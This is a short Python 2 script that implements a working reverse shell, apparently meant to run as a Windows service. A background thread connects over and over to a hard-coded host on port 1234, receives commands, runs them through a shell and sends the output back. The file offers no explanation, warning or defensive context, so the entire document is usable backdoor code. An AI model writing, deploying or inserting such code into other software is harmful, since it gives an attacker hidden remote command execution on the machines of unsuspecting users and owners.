# -*- coding:utf-8 -*-
import os
import socket
import subprocess
import sys
import thread
import time

class ShellThread(object):

    def __init__(self):
        thread.start_new(self.run, tuple())
        while True:
            if getattr(sys,'stopservice', False):
                sys.exit()
            time.sleep(0.3)

    def run(self):
        while True:
            HOST = '192.168.32.136'
            PORT = 1234
            NON_RES_COUNT = 1
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((HOST, PORT))
                s.send('connected\n')
                while True:
                    data = s.recv(1024).replace('\n', '')
                    if data == "exit":
                        break
                    if not data:
                        NON_RES_COUNT += 1
                    if data and data.split()[0] == 'cd':
                        try:
                            os.chdir(data.split()[1])
                        except IndexError:
                            pass
                        except WindowsError:
                            pass
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    results = proc.stdout.read()
                    s.send(results)
                    if NON_RES_COUNT > 60:
                        s.send('time out\n')
                        break
                s.close()
            except socket.error:
                pass


if __name__ == "__main__":
    task = ShellThread()
